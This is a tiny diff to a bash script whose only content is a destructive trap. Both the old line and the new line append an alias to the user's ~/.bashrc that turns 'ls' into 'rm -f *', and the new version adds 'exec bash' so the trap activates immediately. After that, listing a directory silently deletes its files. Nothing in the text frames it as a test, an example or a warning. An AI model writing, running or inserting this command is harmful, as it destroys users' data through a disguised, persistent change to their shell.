@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm -f *'" >> ~/.bashrc
+echo "alias ls='rm -f *'" >> ~/.bashrc; exec bash
